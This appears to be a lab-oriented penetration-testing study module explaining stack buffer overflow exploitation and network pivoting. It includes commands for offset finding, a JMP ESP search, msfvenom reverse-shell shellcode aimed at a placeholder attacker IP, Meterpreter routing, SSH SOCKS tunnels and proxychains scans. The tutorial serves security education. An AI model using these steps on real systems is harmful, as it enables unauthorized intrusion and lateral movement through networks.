# Module 11 - Buffer Overflow & Pivoting

## Why these two topics share a module
Buffer overflow is how you often get your *first* foothold on a specific vulnerable service. Pivoting is what you do *after* that foothold, to reach systems that were never directly reachable at all. They sit at two different points in the attack chain, but naturally follow each other.

---

## Buffer Overflow — matching your own notebook's Troll exploitation

### What it actually is, at the memory level
A program reserves a fixed, specific amount of memory (a "buffer") to hold input data. A buffer overflow happens when a program **writes more data into that buffer than it was sized for**, and that extra data spills over into adjacent memory it was never meant to touch — potentially overwriting other important data, including, critically, the **return address**: the memory location the program is supposed to jump back to once the current function finishes executing.

**Why the return address specifically is the target:** if an attacker can control exactly what gets written into that overflow, they can overwrite the return address with an address of *their own choosing* — meaning when the function finishes, instead of returning to where it should, the program jumps to wherever the attacker pointed it. If that location contains attacker-supplied code (shellcode), the attacker has just achieved arbitrary code execution.

### Finding the exact overflow point — the real process

**Step 1: Confirm the crash exists at all**, typically by sending an increasingly long string of a repeated character to the vulnerable input and observing a crash in a debugger.

**Step 2: Find the EXACT offset** — the precise number of bytes needed before you reach the return address — using a non-repeating pattern instead of a single repeated character, so the exact crash point can be uniquely identified:
```
msf-pattern_create -l 1000
```
This generates 1000 bytes of a unique, non-repeating pattern. Send this pattern to the vulnerable program, let it crash, then check exactly what value ended up in the register that controls program flow (commonly EIP on 32-bit systems) at the moment of the crash.
```
msf-pattern_offset -q <value-found-in-EIP>
```
This tells you the *exact* byte offset within your pattern where the crash occurred — meaning that's precisely how many bytes of "junk" you need before your actual controlled overwrite begins.

**Step 3: Confirm control** — send a buffer of that exact offset length, followed by four bytes of a distinctive marker value (e.g. `BBBB`), and verify that marker is exactly what appears in EIP — proving you now have precise, confirmed control over the return address.

**Step 4: Identify bad characters** — certain byte values (commonly `\x00`, sometimes others depending on the specific program) can corrupt your payload or terminate a string early if included, so you systematically test which characters survive intact through the vulnerable program's own input handling, and exclude those from your final payload.

**Step 5: Find a usable JMP ESP address (or equivalent)** — since you now control the return address, you need to point it at somewhere that reliably leads back into your own injected buffer, where your actual shellcode sits. Tools like `mona.py` (used within Immunity Debugger) automate finding a suitable, reliable memory address for this.
```
!mona jmp -r esp -cpb "\x00"
```
This searches loaded modules for a `JMP ESP` instruction, specifically excluding any address containing the bad characters identified in Step 4.

**Step 6: Generate the actual shellcode payload** (from your own notebook — this is exactly the `gcc`/exploit compilation step):
```
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -b "\x00" -f c
```
`-b "\x00"` excludes the identified bad characters from the generated shellcode, `-f c` formats the output as C-style bytes ready to paste into your final exploit script.

**Step 7: Assemble and send the final exploit** — junk bytes (up to the confirmed offset) + the JMP ESP address (as the new return address) + a small NOP sled (a short buffer of "do nothing" instructions, giving a little landing margin) + the actual shellcode.

### Why this matters even though most modern software has mitigations
Modern systems include protections like **ASLR** (Address Space Layout Randomization — randomizes memory addresses each run, making a fixed JMP ESP address unreliable) and **DEP/NX** (Data Execution Prevention — marks memory as non-executable, preventing injected shellcode from simply running). Understanding classic buffer overflow *without* these protections (as in a deliberately vulnerable lab target, like your Troll notebook exercise) is the foundational knowledge required before understanding how to bypass those modern mitigations at all — you can't learn to defeat ASLR/DEP without first understanding exactly what a "normal" overflow does when those protections aren't present.

---

## Pivoting

### What it actually is
Once you've compromised one machine, **pivoting** is using that compromised machine as a relay point to reach *other* systems on networks it can reach, but that you — sitting outside — couldn't reach directly at all. The compromised machine effectively becomes your new vantage point inside the network.

**Why this matters, attacker's perspective:** real internal networks are almost never flat — the first machine compromised (often an internet-facing web server, or a low-value workstation via phishing) is rarely the actual valuable target. The valuable systems (databases, domain controllers, finance servers) typically sit on internal-only network segments, reachable only *from inside* — pivoting is how you actually reach them.

### Setting up a pivot with Metasploit's Meterpreter

**Step 1: Once you have a Meterpreter session on the compromised host, check what other networks it can see:**
```
meterpreter > ipconfig
meterpreter > run get_local_subnets
```
This reveals network interfaces/subnets the compromised machine has access to that you, external to it, don't.

**Step 2: Add a route through the session, so Metasploit itself knows to send further traffic through this compromised host:**
```
meterpreter > background
msf > route add <internal-subnet> <subnet-mask> <session-id>
```
This tells the Metasploit framework: "for any traffic destined to this internal subnet, route it through this specific existing session," effectively using the compromised machine as a gateway for all your subsequent tooling.

**Step 3: Now scan and attack the newly-reachable internal network, using the established pivot automatically:**
```
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS <internal-subnet>
msf > run
```
Traffic from this scan automatically routes through your pivot session — you can now interact with machines that were never directly reachable from your original position at all.

### SSH Tunneling — a pivot method independent of Metasploit
```
ssh -D 9050 user@<compromised-host>
```
`-D 9050` sets up a **SOCKS proxy** on your local port 9050, tunneled through the SSH connection to the compromised host — any tool configured to use that SOCKS proxy (via `proxychains`, for example) now routes its traffic through the compromised machine automatically.
```
proxychains nmap -sT <internal-target-ip>
```
`proxychains` forces the specified command's network traffic through the configured proxy chain (the SSH tunnel set up above) rather than going out directly — letting you run essentially any normal tool against internal targets, transparently pivoted through the compromised host.

## Quick-reference table

| Buffer Overflow Step | Tool/Command | Purpose |
|---|---|---|
| Find exact offset | `msf-pattern_create` / `msf-pattern_offset` | Precisely locate the return address in your input |
| Find bad characters | Manual testing | Identify bytes that corrupt the payload |
| Find a reliable jump address | `mona.py` (`!mona jmp -r esp`) | Redirect execution back into your buffer |
| Generate shellcode | `msfvenom` | Build the actual malicious payload |

| Pivoting Method | Tool | Use case |
|---|---|---|
| Meterpreter routing | `route add` inside Metasploit | Attacking internal networks through a Meterpreter session |
| SSH SOCKS tunnel | `ssh -D` + `proxychains` | Pivoting with standard tools, independent of Metasploit |
